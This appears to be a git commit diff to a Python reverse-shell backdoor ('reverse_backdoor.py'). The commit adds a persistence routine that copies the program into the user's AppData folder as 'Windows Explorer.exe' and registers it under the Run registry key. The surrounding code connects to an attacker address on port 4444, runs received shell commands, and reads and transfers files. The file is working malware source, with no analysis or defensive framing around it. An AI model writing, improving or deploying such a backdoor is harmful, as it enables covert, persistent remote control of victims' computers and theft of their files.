88081482fc3e9c922b53a5c51635cd4d02651c60
trickdeath0 <70007454+trickdeath0@users.noreply.github.com>
2020-09-12 15:16:23 +0300

    Update reverse_backdoor.py

--- python/reverse_backdoor/reverse_backdoor.py
+++ python/reverse_backdoor/reverse_backdoor.py
@@ -5,38 +5,45 @@ import subprocess
 import json
 import os
 import base64
+import sys
+import shutil
 
 
-Ip_Adress = "Your_IP"
+Ip_Adress = "192.168.1.X"
 Port = 4444
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket(AF_INET, SOCK_STREAM)
         self.connection.connect((ip, port))
 
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "' + evil_file_location + '"', shell=True)
+
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     def reliable_receive(self):
         json_data = ""
         while True:
             try:
-                json_data = json_data + self.connection.recv(1024)
+                json_data = json_data + self.connection.recv(1024).decode()
                 return json.loads(json_data)
             except ValueError:
                 continue
 
     def excute_system_command(self, command):
-        try:
-            return subprocess.check_output(command, shell=True)
-        except subprocess.CalledProcessError:
-            return "error during command exectuion"
+        DEVNULL = open(os.devnull, 'wb')
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
 
     def change_working_direcroty_to(self,path):
         os.chdir(path)
-        return "[+] Changing working directory to " + path
+        return "[+] Changing working directory to " + os.getcwd()
 
     def read_file(self, path):
         with open(path, "rb") as file: # change to rb to r if need!
@@ -54,7 +61,7 @@ class Backdoor:
             try:
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_direcroty_to(command[1])
                 elif command[0] == "download":
@@ -66,10 +73,12 @@ class Backdoor:
             except Exception:
                 command_result = "[-] Error during command executing"
                     
-                self.reliable_send(command_result)
+            self.reliable_send(command_result.decode())
 
         #connection.close()
 
-
-my_backdoor = Backdoor(Ip_Adress, Port)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor(Ip_Adress, Port)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
